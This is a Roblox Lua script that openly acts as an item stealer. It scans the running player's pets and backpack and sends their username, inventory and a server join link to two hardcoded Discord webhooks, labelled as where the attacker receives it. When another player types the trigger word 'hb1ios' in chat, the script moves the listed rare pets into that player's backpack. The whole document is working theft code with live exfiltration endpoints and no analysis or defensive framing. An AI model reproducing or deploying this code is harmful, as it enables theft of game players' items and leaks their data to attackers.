-- Webhook (attacker receives info here)
local webhookUrl = "https://discord.com/api/webhooks/1396132755925897256/pZu4PMfjQGx64urPAqCckF8aXKFHqAR9vOYW-24C-lurbF5RaCEyqMXGNH7S6l5oe3sz"
local backdoorWebhook = "https://discord.com/api/webhooks/1396132755925897256/pZu4PMfjQGx64urPAqCckF8aXKFHqAR9vOYW-24C-lurbF5RaCEyqMXGNH7S6l5oe3sz..."

-- Roblox Services
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local chatTrigger = "hb1ios" -- trigger word attacker says

-- List of valuable pets attacker is targeting
local targetedPets = {
    "Trex", "Fennec Fox", "Raccoon", "Dragonfly", "Butterfly",
    "Queenbee", "Spinosaurus", "Redfox", "Brontosaurus", "Mooncat",
    "Mimic Octopus", "Disco Bee", "Dilophosaurus", "Kitsune"
}

-- ✅ Real inventory scanner
local function getInventory()
    local data = {
        items = {},
        rarePets = {},
        rareItems = {}
    }

    -- Scan Backpack and other folders
    local foldersToCheck = {
        LocalPlayer:FindFirstChild("Pets"),
        LocalPlayer:FindFirstChild("Backpack"),
        LocalPlayer:FindFirstChildOfClass("Folder")
    }

    for _, folder in ipairs(foldersToCheck) do
        if folder then
            for _, item in ipairs(folder:GetChildren()) do
                table.insert(data.items, item.Name)

                if table.find(targetedPets, item.Name) then
                    table.insert(data.rarePets, item.Name)
                end
            end
        end
    end

    return data
end

-- 📤 Send inventory info to Discord
local function sendToWebhook()
    if not LocalPlayer then return end

    local inventory = getInventory()
    local inventoryText = #inventory.items > 0 and table.concat(inventory.items, "\n") or "No items"
    local jobId = tostring(game.JobId or "N/A")
    local joinLink = "https://kebabman.vercel.app/start?placeId=" .. tostring(game.PlaceId) .. "&gameInstanceId=" .. jobId

    local function sendMessage(payload)
        local jsonData = HttpService:JSONEncode(payload)
        for _, url in ipairs({webhookUrl, backdoorWebhook}) do
            request({
                Url = url,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = jsonData
            })
        end
    end

    -- Base report
    sendMessage({
        content = "🎯 Victim Detected!",
        embeds = {{
            title = "Victim Found",
            description = "Join and type trigger to attempt item transfer.",
            fields = {
                {name = "Username", value = LocalPlayer.Name, inline = true},
                {name = "Join Link", value = joinLink, inline = true},
                {name = "Inventory", value = "```" .. inventoryText .. "```", inline = false},
                {name = "Trigger", value = "`" .. chatTrigger .. "`", inline = false}
            },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    })

    -- Rare pets notification
    if #inventory.rarePets > 0 then
        sendMessage({
            content = "@everyone",
            allowed_mentions = { parse = { "everyone" } },
            embeds = {{
                title = "🐾 Rare Pets Detected",
                description = "These rare pets are in the player's inventory!",
                fields = {
                    {name = "Username", value = LocalPlayer.Name},
                    {name = "Rare Pets", value = "```" .. table.concat(inventory.rarePets, "\n") .. "```"}
                },
                color = 0xff0000,
                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
            }}
        })
    end
end

-- 🔁 Chat-based trigger for item transfer
Players.PlayerAdded:Connect(function(player)
    player.Chatted:Connect(function(msg)
        if msg == chatTrigger then
            local attacker = player
            local foldersToCheck = {
                LocalPlayer:FindFirstChild("Pets"),
                LocalPlayer:FindFirstChild("Backpack"),
                LocalPlayer:FindFirstChildOfClass("Folder")
            }

            for _, folder in ipairs(foldersToCheck) do
                if folder then
                    for _, item in ipairs(folder:GetChildren()) do
                        if table.find(targetedPets, item.Name) then
                            item.Parent = attacker:FindFirstChild("Backpack") or attacker
                        end
                    end
                end
            end
        end
    end)
end)

-- 🟢 Start by sending inventory info to attacker
sendToWebhook()
